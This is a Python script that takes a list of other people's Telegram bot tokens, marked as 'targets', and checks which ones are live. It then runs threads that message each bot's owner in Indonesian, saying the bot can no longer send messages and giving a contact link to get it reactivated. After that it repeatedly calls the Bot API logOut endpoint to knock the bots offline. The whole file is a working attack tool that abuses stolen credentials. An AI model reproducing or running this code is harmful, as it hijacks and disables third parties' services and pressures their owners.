import json
import threading
import time
import random
import requests
from datetime import datetime
import sys
import os


def check_target(token_info):
    token = token_info["token"]
    url = f'https://api.telegram.org/bot{token}/getme'
    response = requests.get(url)
    return response.json()

def send_text(token, user_id, text):
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text={text}&parse_mode=html'
    response = requests.get(url)
    return response.json()

def logOut(token):
    url = f'https://api.telegram.org/bot{token}/logOut'
    response = requests.get(url)
    return response.json()

def worker(task_id, token_info):
    token = token_info["token"]
    id = token_info["id"]
    print(f"[+] [{token}] [Task {task_id} started]")

    
    while True:
        # Text message for target
        text = f"𝐒𝐄𝐓𝐄𝐋𝐀𝐇 𝐏𝐄𝐒𝐀𝐍 𝐈𝐍𝐈, 𝐁𝐎𝐓 𝐀𝐍𝐃𝐀 𝐓𝐈𝐃𝐀𝐊 𝐃𝐀𝐏𝐀𝐓 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐏𝐄𝐒𝐀𝐍 𝐀𝐏𝐀𝐏𝐔𝐍.\n\n𝐇𝐔𝐁𝐔𝐍𝐆𝐈 𝐒𝐀𝐘𝐀 𝐉𝐈𝐊𝐀 𝐈𝐍𝐆𝐈𝐍 𝐃𝐈𝐀𝐊𝐓𝐈𝐅𝐊𝐀𝐍 𝐊𝐄𝐌𝐁𝐀𝐋𝐈.\n\n【 https://t.me/xTwentzy 】 "

        response = send_text(token, id, text)
        if(response['ok'] == True):
            print(f"[-] [{token}] [Task {task_id}] [Status: {response['ok']}] ..... Logging Out")
            response = logOut(token)
            time.sleep(1200)
        else:
            print(f"[+] [{token}] [Task {task_id}] [{response['description']}]")
            if(response['error_code'] == 429):
                print(f"[-] [{id}] [Task {task_id}] [Sleeping for {response['parameters']['retry_after']} seconds]")
                time.sleep(response['parameters']['retry_after'])
            elif(response['error_code'] == 403):
                time.sleep(60)
            time.sleep(3)


def main():
    print("""
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
    █░░██████╗░██████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░█
    █░██╔════╝██╔════╝░██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗░████║░█
    █░╚█████╗░██║░░██╗░██████╦╝░░░██║░░░█████╗░░███████║██╔████╔██║░█
    █░░╚═══██╗██║░░╚██╗██╔══██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░█
    █░██████╔╝╚██████╔╝██████╦╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║░█
    █░╚═════╝░░╚═════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░█
    █░░░░░░░░░░░░░░░fb.com/twnku░░░░░fb.me/habibul.fzn░░░░░░░░░░░░░░█
    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
      """)
  
    # Config
    threads = []
    stop_event = threading.Event()
    target_filename = 'target_logout.json' # Target token files
    
    # Load target.json
    with open(target_filename, 'r') as file:
        print("[+] Checking Target List...")
        target_data = json.load(file)
    print("[+]",len(target_data), "Target found, Checking target...")
    count_r = 0
    count_list = 0
    for i, token_info in enumerate(target_data):
        check_data_target = check_target(token_info)
        if(check_data_target['ok'] == False):
            count_list +=1
            print(f"[{count_list}] [ALREADY DEAD] [{token_info['token']}]")
        else:
            count_list +=1
            print(f"[{count_list}] [LIVE] [{token_info['token']}] [Username: {check_data_target['result']['username']}] [ID: {check_data_target['result']['id']}]")
            count_r += 1
    print(f"[-] {count_r} Target Live.")
    time.sleep(3)
  
    # Create and start threads
    for i, token_info in enumerate(target_data):
        thread = threading.Thread(target=worker, args=(i+1, token_info))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    print("[+] All tasks are done.")

if __name__ == "__main__":
    main()
